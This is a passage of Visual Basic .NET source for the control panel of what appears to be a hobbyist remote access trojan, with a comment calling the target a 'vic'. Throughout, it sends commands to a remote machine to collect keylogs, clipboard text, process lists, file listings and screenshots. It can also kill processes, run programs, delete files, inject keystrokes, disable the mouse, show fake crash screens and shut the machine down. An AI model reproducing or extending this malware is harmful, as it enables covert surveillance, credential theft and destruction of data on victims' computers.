                Dim myEndPoint As IPEndPoint = TempClient.Client.RemoteEndPoint
                'AddToListBox(myEndPoint.Address.ToString)
                'Stores it Address in the List Box With a Delegate
                TempClient.Close()
                'Closes the Client

            End While


        Catch ex As Exception
            If debug.Visible = True Then
                debug.ListBox1.Items.Add(ex.ToString)
            End If
            MsgBox(ex.Message)
        End Try

    End Sub
    Public Delegate Sub AddItemDelegate(ByVal AddThis As String)

    Sub AddToListBox(ByVal AddThis As String)
        'A Delegate to Store the address of the incomming connection in a listbox

        ListBox1.Items.Add("Connected to:" & AddThis)



    End Sub



    'keylog files ender

    '
    Sub ListenAlways2()

        'Listen 4 InComming Connections
        Dim MyListener2 As TcpListener
        'Dim MyIp As IPAddress = Dns.GetHostAddresses("localhost")(0)
        'MyListener = New TcpListener(MyIp, ListenPort)

        MyListener2 = New TcpListener(IPAddress.Any, ListenPort2)
        MyListener2.Start()


        Try
            While (True)

                Application.DoEvents()

                Dim TempClient2 As TcpClient = MyListener2.AcceptTcpClient
                'Accept the Client

                NoofClients2 += 1

                Dim myEndPoint2 As IPEndPoint = TempClient2.Client.RemoteEndPoint
                'AddToListBox(myEndPoint.Address.ToString)
                'Stores it Address in the List Box With a Delegate
                TempClient2.Close()
                'Closes the Client

            End While


        Catch ex As Exception
            If debug.Visible = True Then
                debug.ListBox1.Items.Add(ex.ToString)
            End If
            MsgBox(ex.Message)
        End Try

    End Sub
    Public Delegate Sub AddItemDelegate2(ByVal AddThis As String)

    Sub AddToListBox2(ByVal AddThis As String)
        'A Delegate to Store the address of the incomming connection in a listbox

        ListBox1.Items.Add("Connected to:" & AddThis)



    End Sub


    'end keylog



    ' This chat Program has 2 send buttons overlapping, dont blame me as im only a beginner
    Private Sub c_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles c.Click
        ListBox1.Items.Add("[Starting connection]")

        Dim myip As IPAddress = IPAddress.Parse(TextBox1.Text)

        Dim port As Integer = 8000
        Dim info As New IPEndPoint(myip, port)
        Dim clientconnect As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        Try
            clientconnect.Connect(info)

            Dim mybytes(1024) As Byte
            Dim mystr As String = "6"
            mybytes = System.Text.Encoding.ASCII.GetBytes(mystr)
            clientconnect.Send(mybytes, mybytes.Length, SocketFlags.None)

        Catch ex As Exception
            If debug.Visible = True Then
                debug.ListBox1.Items.Add(ex.ToString)
            End If
            MsgBox(ex.StackTrace.ToString)
        End Try
    End Sub


    ' Private Sub w1_ConnectionRequest(ByVal sender As Object, ByVal e As AxMSWinsockLib.DMSWinsockControlEvents_ConnectionRequestEvent)
    'Used In Host(Server)
    ' w1.Close() 'stop connection
    ' w1.Accept(e.requestID) 'get the connection made
    ' rt.Items.Add("Client Connected") 'shows the Client has connected on the Chat Window
    'End Sub


    Private Sub myread()
        Do While True
            serversocket = tcpcin.AcceptTcpClient()

            Dim nstream As NetworkStream = serversocket.GetStream
            Dim bit(serversocket.ReceiveBufferSize) As Byte
            nstream.Read(bit, 0, CInt(serversocket.ReceiveBufferSize))
            Dim str As String = System.Text.Encoding.ASCII.GetString(bit)
            'RaiseEvent updatetext(msg)

            Me.SetText(str)
        Loop

    End Sub



    Public Sub SetText(ByVal txt As Object)


        ' Dim dat As Object
        ' w1.GetData(dat) 'To recive the incomming data(TEXT)

        cmd = txt 'shows the data(TEXT) recived on the Chat Window

        Dim id() As String = Split(cmd, "*", -1, CompareMethod.Text)


        If id(0) = "1" Then
            'log
            If rt.InvokeRequired Then
                Dim d As New setcallback(AddressOf SetText)
                Me.Invoke(d, New Object() {txt})
            Else
                rt.Items.Add(id(1))
            End If

        End If

        If id(0) = "2" Then
            'keylog
            If TextBox6.InvokeRequired Then
                Dim d As New setcallback(AddressOf SetText)
                Me.Invoke(d, New Object() {txt})
                keylog = id(1)
            Else
                TextBox6.Text &= keylog
            End If
        End If

        If id(0) = "3" Then
            'info
            If TextBox2.InvokeRequired Then
                Dim d As New setcallback(AddressOf SetText)
                Me.Invoke(d, New Object() {txt})
            Else
                inf0 = id(1)
                TextBox2.Text &= id(1)
            End If
        End If

        If id(0) = "4" Then
            'processes
            Try

                Dim proc As String = id(1)

                Dim procIDnum As Integer = 0
                Dim proclist() As String = Split(proc, "|", -1, CompareMethod.Text)

                While Not proclist(procIDnum + 1).Length = 0
                    If proclist(procIDnum + 1) = "" Then
                        Exit Sub
                    End If

                    If proclist(procIDnum + 1).Length.Equals(0) Then
                        Exit Sub
                    End If

                    If ListBox3.InvokeRequired Then
                        Dim d As New setcallback(AddressOf SetText)
                        Me.Invoke(d, New Object() {txt})
                    Else
                        ListBox3.Items.Add(proclist(procIDnum))
                    End If
                    procIDnum = procIDnum + 1

                End While

            Catch ex As Exception
                If debug.Visible = True Then
                    debug.ListBox1.Items.Add(ex.ToString)
                End If
                Exit Sub ' so no more processes added
            End Try
        End If



        If id(0) = "5" Then
            If TextBox3.InvokeRequired Then
                Dim d As New setcallback(AddressOf SetText)
                Me.Invoke(d, New Object() {txt})
            Else
                'clipboard
                Dim clipb As String = id(1)
                TextBox3.Text = id(1)
            End If
        End If


        If id(0) = "6" Then



            'filemanager

            'senddata("6*" & list.ToString & "-" & list2.ToString & "-" & list3.ToString)


            Dim filestuff() As String = Split(id(1), "-", -1, CompareMethod.Text)

            If ListBox2.InvokeRequired Then
                Dim d As New setcallback(AddressOf SetText)
                Me.Invoke(d, New Object() {txt})
            Else
                ListBox2.Items.Clear()
            End If
            Dim proc As String = filestuff(0)
            Dim procIDnum As Integer = 0
            Dim proclist() As String = Split(filestuff(0), "|", -1, CompareMethod.Text)

            While Not proclist(procIDnum + 1).Length = 0
                ListBox2.Items.Add(proclist(procIDnum))
                procIDnum = procIDnum + 1
            End While


            If ListBox4.InvokeRequired Then
                Dim d As New setcallback(AddressOf SetText)
                Me.Invoke(d, New Object() {txt})
            Else
                ListBox4.Items.Clear()
            End If
            Dim proc2 As String = filestuff(1)

            Dim procIDnum2 As Integer = 0

            Dim proclist2() As String = Split(filestuff(1), "|", -1, CompareMethod.Text)

            While Not proclist2(procIDnum2 + 1).Length = 0

                ListBox4.Items.Add(proclist2(procIDnum2))
                procIDnum2 = procIDnum2 + 1
            End While



            If ListBox5.InvokeRequired Then
                Dim d As New setcallback(AddressOf SetText)
                Me.Invoke(d, New Object() {txt})
            Else
                ListBox5.Items.Clear()
            End If
            Dim proc3 As String = filestuff(2)
            Dim procIDnum3 As Integer = 0

            Dim proclist3() As String = Split(filestuff(2), "|", -1, CompareMethod.Text)

            While Not proclist3(procIDnum3 + 1).Length = 0

                ListBox5.Items.Add(proclist3(procIDnum3))

                procIDnum3 = procIDnum3 + 1
            End While
        End If



        If id(0) = "7" Then
            'chat
            chat.TextBox1.Text &= id(1)


        End If






        If id(0).Length > 1 Then
            MsgBox("Raw data recieved: " & id(0))
        End If







        If chatr = True Then
            chat.TextBox1.Text &= txt
        End If

    End Sub



    Private Sub cs_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cs.Click
        'For Connect(Client)
        senddata("1*" & txt.Text & "*" & TextBox11.Text)
    End Sub

    Private Function temstring(ByVal strData As Array) As String
        'Used in Host(Server) and Connect(Client)
        'need to bind the data as object or somthing like that
        Dim temp As Long, mString As String
        mString = ""
        For temp = 0 To UBound(strData)
            mString &= Chr(strData(temp))
        Next
        Return mString
    End Function

    Private Sub w1_ConnectEvent(ByVal sender As System.Object, ByVal e As System.EventArgs)
        'For Connect(Client)
        rt.Items.Add("Connected to Server")
    End Sub






    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        senddata("6")





        ListBox1.Items.Add("[Testing connection]")

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub Button38_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button38.Click
        senddata("30")

    End Sub


    Private Sub Button25_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button25.Click
        senddata("31")

    End Sub

    Private Sub Button1_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim saveloc As String = InputBox("Location to save", , "C:\keylogs\" & My.Computer.Info.AvailableVirtualMemory & "\log.txt")

        My.Computer.FileSystem.WriteAllText(saveloc, TextBox6.Text, True)

    End Sub

    Private Sub Button17_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button17.Click
        'Get clip
        clipb = True
        senddata("7")
    End Sub

    Private Sub Button15_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button15.Click
        'clear
        senddata("8")
    End Sub

    Private Sub Button16_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button16.Click
        'write
        Dim clippy As String = InputBox("Text to put in vics clipboard", "lol")
        senddata("9*" & clippy)
    End Sub

    Private Sub Button39_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button39.Click
        senddata("10")
    End Sub

    Private Sub Button40_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button40.Click

        senddata("11")

    End Sub

    Private Sub Button24_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button24.Click
        senddata("13*" & TextBox4.Text)
    End Sub

    Private Sub Button22_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button22.Click
        senddata("13*{ESC}")
    End Sub

    Private Sub Button26_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button26.Click
        senddata("13*{TAB}")
    End Sub

    Private Sub Button27_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button27.Click
        senddata("13*{CAPSLOCK}")
    End Sub

    Private Sub Button32_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button32.Click
        senddata("13*{F" & TextBox5.Text & "}")
    End Sub

    Private Sub Button31_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button31.Click
        senddata("13*{UP}")

    End Sub

    Private Sub Button29_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button29.Click
        senddata("13*{LEFT}")

    End Sub

    Private Sub Button19_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button19.Click
        senddata("13*{BACKSPACE}")

    End Sub

    Private Sub Button23_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button23.Click
        senddata("13*{DEL}")

    End Sub

    Private Sub Button18_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button18.Click
        senddata("13*{ENTER}")

    End Sub

    Private Sub Button20_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button20.Click
        senddata("13*{NUMLOCK}")

    End Sub

    Private Sub Button21_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button21.Click
        senddata("13*{INS}")

    End Sub

    Private Sub Button37_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button37.Click
        senddata("14")
        ListBox1.Items.Add("[Killing all processes]")
        'kill all processes
    End Sub

    Private Sub Button34_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button34.Click
        'senddata("15") 'old slow method of sending logs by winsock


        senddata("15")
        Dim ListenThread2 As New Thread(New ThreadStart(AddressOf ListenAlways2))
        ListenThread2.Start()
        Button74.Enabled = True

    End Sub

    Private Sub Button41_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button41.Click
        TextBox6.Text = ""
    End Sub

    Private Sub Button14_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button14.Click

        senddata("41")
        Dim ListenThread As New Thread(New ThreadStart(AddressOf ListenAlways))
        ListenThread.Start()

        Button42.Enabled = True
        Button61.Enabled = True
    End Sub


    Private Sub Button43_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button43.Click
        'load directory

        senddata("47*" & TextBox14.Text)
    End Sub

    Private Sub Button44_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button44.Click
        'get processes
        proc = True

        If Button44.Text = "Refresh" Then

            ListBox3.Items.Clear()
            senddata("17")

        Else
            senddata("17")

            Button44.Text = "Refresh"
        End If
    End Sub

    Private Sub Button36_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button36.Click
        'kill
        senddata("18*" & ListBox3.SelectedItem & ".exe")
    End Sub

    Sub senddata(ByVal txt As String)

        Dim myip As IPAddress = IPAddress.Parse(TextBox1.Text)
        Dim port As Integer = 8000
        Dim info As New IPEndPoint(myip, port)
        Dim clientconnect As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        Try

            If debug.Visible = True Then
                debug.ListBox1.Items.Add(myip.ToString)
                debug.ListBox1.Items.Add(info.ToString)
            End If

            clientconnect.Connect(info)

            Dim mybytes(1024) As Byte
            Dim mystr As String = txt
            mybytes = System.Text.Encoding.ASCII.GetBytes(mystr)
            clientconnect.Send(mybytes, mybytes.Length, SocketFlags.None)
        Catch ex As Exception
            If debug.Visible = True Then
                debug.ListBox1.Items.Add(ex.ToString)
            End If
            MsgBox(ex.ToString)

            If debug.Visible = True Then
                debug.ListBox1.Items.Add(ex.ToString)
            End If
        End Try



    End Sub

    Sub ipsend(ByVal txt As String)

        Dim nstream As NetworkStream = sock.GetStream()
        Dim bit As [Byte]() = System.Text.Encoding.ASCII.GetBytes(txt)
        nstream.Write(bit, 0, bit.Length)

    End Sub
    Private Sub Button46_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button46.Click
        senddata("19")
        ListBox1.Items.Add("[Makin red screen]")
    End Sub

    Private Sub Button47_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button47.Click
        senddata("20")
        ListBox1.Items.Add("[Makin blue screen]")
    End Sub

    Private Sub Button48_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button48.Click
        senddata("21")
        ListBox1.Items.Add("[Makin green screen]")
    End Sub

    Private Sub Button49_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button49.Click
        senddata("22")
        ListBox1.Items.Add("[Screen is dimmed]")
    End Sub

    Private Sub Button50_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button50.Click
        senddata("23")
        ListBox1.Items.Add("[screen is pure black]")
    End Sub

    Private Sub Button51_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button51.Click
        senddata("24")
        ListBox1.Items.Add("[Hiding all screen effects]")
    End Sub

    Private Sub Button52_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button52.Click
        senddata("25")
        ListBox1.Items.Add("[Faking a ubuntu desktop]")
    End Sub

    Private Sub Button53_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button53.Click
        senddata("26")
        ListBox1.Items.Add("[Making a fake BSOD]")
    End Sub

    Private Sub Button45_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button45.Click
        senddata("27*" & TextBox8.Text)
    End Sub

    Private Sub Button10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button10.Click
        ListBox1.Items.Add("[kill mouse]")

        senddata("28")
    End Sub

    Private Sub Button9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button9.Click
        senddata("29")
        ListBox1.Items.Add("[enable mouse]")

    End Sub

    Private Sub Button13_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button13.Click
        senddata("33")
        ListBox1.Items.Add("[swappin mouse]")
    End Sub


    Private Sub Button11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button11.Click
        senddata("34*" & TextBox9.Text)
    End Sub


    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        ListBox1.Items.Add("[Sending shutdown signal]")
        senddata("2")
    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        ListBox1.Items.Add("[Sending logoff signal]")
        senddata("3")
    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        ListBox1.Items.Add("[Sending restart signal]")
        senddata("4")
    End Sub

    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        ListBox1.Items.Add("[Sending hibernate signal]")
        senddata("5")
    End Sub

    Private Sub Button7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button7.Click
        ListBox1.Items.Add("[Opening CD drive]")
        senddata("10")
    End Sub

    Private Sub Button8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button8.Click
        ListBox1.Items.Add("[Closing Cd drive]")
        senddata("11")
    End Sub

    Private Sub Button12_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button12.Click
        senddata("36*" & "start " & TextBox10.Text)

    End Sub

    Private Sub Button33_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button33.Click
        TextBox2.Text = ""
    End Sub

    Private Sub Button35_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button35.Click
        Batch.Show()
    End Sub

    Private Sub Button59_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button59.Click
        senddata("999")
        chat.Show()
    End Sub

    Private Sub Button60_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button60.Click
        Dim x As String = InputBox("X co-ords", "100")
        Dim y As String = InputBox("y co-ords", "100")

        senddata("40*" & x & "*" & y)
    End Sub

    Private Sub Button61_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button61.Click
        If Not Button61.Text = "Show" Then
            Button61.Text = "Refresh"
        End If
        Try
            Dim FilName As String = Environment.CurrentDirectory & "\" & "scrn.bmp"
            Dim fStram As New FileStream(FilName, FileMode.Create)
            'Creates the File Where we are going to receive the File From the Sender

            Dim ImageSenderAddress As IPAddress = Dns.GetHostAddresses(TextBox1.Text)(0)
            'Gets the IPAddress Where i have to Connect

            Dim ClientToSee As TcpClient
            Try
                ClientToSee = New TcpClient()
                ClientToSee.Connect(ImageSenderAddress, RequestPort)
                'Connects to the Image Sender

            Catch ex As Exception
                If debug.Visible = True Then
                    debug.ListBox1.Items.Add(ex.ToString)
                End If
                MsgBox("Sorry !!!,Please ReStart the Sender")
                MsgBox(ex.ToString)
                fStram.Close()
                Exit Sub
            End Try


            Dim NStream As NetworkStream = New NetworkStream(ClientToSee.Client)
            'Gets the Stream to Communicate

            mReader = New BinaryReader(NStream)
            Dim buffer(1024 - 1) As Byte
            Do While True
                Dim bytesRead As Integer = mReader.Read(buffer, 0, buffer.Length)
                If bytesRead = 0 Then Exit Do
                fStram.Write(buffer, 0, bytesRead)
                fStram.Flush()
            Loop

            'Gets the Screen Shot and Closes the Stream
            fStram.Close()
            fStram.Dispose()
            fStram = Nothing
            ClientToSee.Close()

            'Finally Showing the Screen Shot in the Picture Box
            Dim fs As New System.IO.FileStream(FilName, IO.FileMode.Open, IO.FileAccess.Read)
            Dim imgCurrentPhoto As Image = Image.FromStream(fs)
            PictureBox1.Image = imgCurrentPhoto
            fs.Dispose()
        Catch ex As Exception
            If debug.Visible = True Then
                debug.ListBox1.Items.Add(ex.ToString)
            End If
            MsgBox(ex.Message)
            If debug.Visible = True Then
                debug.ListBox1.Items.Add(ex.ToString)
            End If
        End Try
    End Sub


    Public Sub refrsh()
        Try
            Dim FilName As String = Environment.CurrentDirectory & "\" & "scrn.bmp"
            Dim fStram As New FileStream(FilName, FileMode.Create)
            'Creates the File Where we are going to receive the File From the Sender

            Dim ImageSenderAddress As IPAddress = Dns.GetHostAddresses(TextBox1.Text)(0)
            'Gets the IPAddress Where i have to Connect

            Dim ClientToSee As TcpClient
            Try
                ClientToSee = New TcpClient()
                ClientToSee.Connect(ImageSenderAddress, RequestPort)
                'Connects to the Image Sender

            Catch ex As Exception
                If debug.Visible = True Then
                    debug.ListBox1.Items.Add(ex.ToString)
                End If
                If debug.Visible = True Then
                    debug.ListBox1.Items.Add(ex.ToString)
                End If
                MsgBox("Server error on sending screenshot")
                fStram.Close()
                Exit Sub
            End Try


            Dim NStream As NetworkStream = New NetworkStream(ClientToSee.Client)
            'Gets the Stream to Communicate

            mReader = New BinaryReader(NStream)
            Dim buffer(1024 - 1) As Byte
            Do While True
                Dim bytesRead As Integer = mReader.Read(buffer, 0, buffer.Length)
                If bytesRead = 0 Then Exit Do
                fStram.Write(buffer, 0, bytesRead)
                fStram.Flush()
            Loop

            'Gets the Screen Shot and Closes the Stream
            fStram.Close()
            fStram.Dispose()
            fStram = Nothing
            ClientToSee.Close()

            'Finally Showing the Screen Shot in the Picture Box
            Dim fs As New System.IO.FileStream(FilName, IO.FileMode.Open, IO.FileAccess.Read)
            Dim imgCurrentPhoto As Image = Image.FromStream(fs)
            rem_control.PictureBox1.Image = imgCurrentPhoto

            fs.Dispose()
        Catch ex As Exception
            If debug.Visible = True Then
                debug.ListBox1.Items.Add(ex.ToString)
            End If
            MsgBox(ex.Message)
        End Try
    End Sub
    Private Sub Button42_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button42.Click
        rem_control.Show()
        Try
            Dim FilName As String = Environment.CurrentDirectory & "\" & "scrn.bmp"
            Dim fStram As New FileStream(FilName, FileMode.Create)
            'Creates the File Where we are going to receive the File From the Sender

            Dim ImageSenderAddress As IPAddress = Dns.GetHostAddresses(TextBox1.Text)(0)
            'Gets the IPAddress Where i have to Connect

            Dim ClientToSee As TcpClient
            Try
                ClientToSee = New TcpClient()
                ClientToSee.Connect(ImageSenderAddress, RequestPort)
                'Connects to the Image Sender

            Catch ex As Exception
                If debug.Visible = True Then
                    debug.ListBox1.Items.Add(ex.ToString)
                End If
                MsgBox("Server error on sending screenshot")
                fStram.Close()
                Exit Sub
            End Try


            Dim NStream As NetworkStream = New NetworkStream(ClientToSee.Client)
            'Gets the Stream to Communicate

            mReader = New BinaryReader(NStream)
            Dim buffer(1024 - 1) As Byte
            Do While True
                Dim bytesRead As Integer = mReader.Read(buffer, 0, buffer.Length)
                If bytesRead = 0 Then Exit Do
                fStram.Write(buffer, 0, bytesRead)
                fStram.Flush()
            Loop

            'Gets the Screen Shot and Closes the Stream
            fStram.Close()
            fStram.Dispose()
            fStram = Nothing
            ClientToSee.Close()

            'Finally Showing the Screen Shot in the Picture Box
            Dim fs As New System.IO.FileStream(FilName, IO.FileMode.Open, IO.FileAccess.Read)
            Dim imgCurrentPhoto As Image = Image.FromStream(fs)
            rem_control.PictureBox1.Image = imgCurrentPhoto

            fs.Dispose()
        Catch ex As Exception
            If debug.Visible = True Then
                debug.ListBox1.Items.Add(ex.ToString)
            End If
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Button62_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button62.Click
        senddata("42")
        c.Enabled = True
    End Sub

    Private Sub Button63_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button63.Click
        If TextBox12.Text < 20000 Or TextBox12.Text > 40 Then
            senddata("43*" & TextBox12.Text & "*" & TextBox13.Text)
            rt.Items.Add("Trying to beep the host")

        Else
            MsgBox("Warning! audible frequency is between 30 to approx 20000")
        End If
    End Sub

    Private Sub Button70_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button70.Click
        senddata("45")

    End Sub

    Private Sub Button65_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button65.Click
        senddata("44*1360*768")

    End Sub

    Private Sub Button74_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button74.Click
        Try
            Dim FilName As String = Environment.CurrentDirectory & "\" & "log.txt"
            Dim fStram As New FileStream(FilName, FileMode.Create)
            'Creates the File Where we are going to receive the File From the Sender

            Dim ImageSenderAddress As IPAddress = Dns.GetHostAddresses(TextBox1.Text)(0)
            'Gets the IPAddress Where i have to Connect

            Dim ClientToSee As TcpClient
            Try
                ClientToSee = New TcpClient()
                ClientToSee.Connect(ImageSenderAddress, RequestPort2)
                'Connects to the log Sender

            Catch ex As Exception
                If debug.Visible = True Then
                    debug.ListBox1.Items.Add(ex.ToString)
                End If
                MsgBox("Server error on sending keylog")
                fStram.Close()
                Exit Sub
            End Try


            Dim NStream As NetworkStream = New NetworkStream(ClientToSee.Client)
            'Gets the Stream to Communicate

            mReader = New BinaryReader(NStream)
            Dim buffer(1024 - 1) As Byte
            Do While True
                Dim bytesRead As Integer = mReader.Read(buffer, 0, buffer.Length)
                If bytesRead = 0 Then Exit Do
                fStram.Write(buffer, 0, bytesRead)
                fStram.Flush()
            Loop

            'Gets log and close
            fStram.Close()
            fStram.Dispose()
            fStram = Nothing
            ClientToSee.Close()

            'show log

            My.Computer.FileSystem.ReadAllText(Environment.CurrentDirectory & "\" & "log.txt")
            offlineKeylog.Show()
            offlineKeylog.TextBox1.Text = My.Computer.FileSystem.ReadAllText(Environment.CurrentDirectory & "\" & "log.txt")


        Catch ex As Exception
            If debug.Visible = True Then
                debug.ListBox1.Items.Add(ex.ToString)
            End If
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Button75_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button75.Click
        ' senddata("46*" & ListView1.SelectedIndices)

    End Sub

    Private Sub Button64_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button64.Click
        senddata("44*1366*768")
    End Sub

    Private Sub Button69_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button69.Click
        senddata("44*1280*768")

    End Sub

    Private Sub Button66_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button66.Click
        senddata("44*1280*720")

    End Sub

    Private Sub Button68_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button68.Click
        senddata("44*1280*600")

    End Sub

    Private Sub Button67_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button67.Click
        senddata("44*1024*768")

    End Sub

    Private Sub Button72_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button72.Click
        senddata("44*1024*600")

    End Sub

    Private Sub Button73_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button73.Click
        senddata("44*800*600")

    End Sub


    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        Dim miiip As System.Net.IPHostEntry = System.Net.Dns.GetHostByName(System.Net.Dns.GetHostName)
        Label6.Text = miiip.AddressList.GetValue(0).ToString

        tcpcin.Start()

        Dim readthread As New Thread(New ThreadStart(AddressOf myread))
        readthread.Start()


    End Sub





    Private Sub ListBox2_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ListBox2.SelectedIndexChanged

    End Sub

    Private Sub waitfortrans_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs)
    End Sub

    Private Sub Button71_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        senddata("48*" & TextBox14.Text)

    End Sub

    Private Sub Button76_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button76.Click
        senddata("49")
        'hide desktop
    End Sub

    Private Sub Button77_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button77.Click
        senddata("50")
        'show desktop
    End Sub

    Private Sub Button78_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button78.Click
        senddata("51")
        'hide lots
    End Sub

    Private Sub Button79_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button79.Click
        senddata("52")
        'show lots
    End Sub

    Private Sub ListBox4_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ListBox4.SelectedIndexChanged
        If ListBox4.SelectedItem = ".." Then


        Else

            senddata("47*" & TextBox14.Text & ListBox4.SelectedItem & "\")
            TextBox14.Text = TextBox14.Text & ListBox4.SelectedItem & "\"
        End If

    End Sub

    Private Sub Button71_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button71.Click
        senddata("47*C:\")
    End Sub

    Private Sub Button80_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button80.Click
        senddata("52")
        'desktop navigate
    End Sub

    Private Sub Button58_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button58.Click
        senddata("53")
        'desktop navigate
    End Sub

    Private Sub Button81_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button81.Click
        senddata("54")
        'desktop navigate
    End Sub

    Private Sub Button82_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button82.Click
        senddata("55")
        'desktop navigate
    End Sub

    Private Sub Button54_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button54.Click
        Dim input As String = InputBox("Directory to delete", "C:\delete")
        senddata("56*" & input)
    End Sub

    Private Sub Button55_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button55.Click
        Dim input As String = InputBox("file to delete", "C:\delete")
        senddata("57*" & input)
    End Sub

    Private Sub Button56_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button56.Click
        Dim input As String = InputBox("Directory to make", "C:\delete")
        senddata("58*" & input)
    End Sub

    Private Sub Button57_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button57.Click
        Dim input As String = InputBox("File location", "C:\delete")
        Dim input2 As String = InputBox("File name", "test.txt")
        Dim input3 As String = InputBox("File contents", "lol")
        senddata("59*" & input & input2 & input3)
    End Sub

    Private Sub Button83_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button83.Click
        senddata("60")

    End Sub

    Private Sub Button84_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button84.Click
        senddata("18*explorer.exe")
    End Sub

    Private Sub Button85_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button85.Click
        'senddata("62")
        senddata("27*explorer.exe")
    End Sub

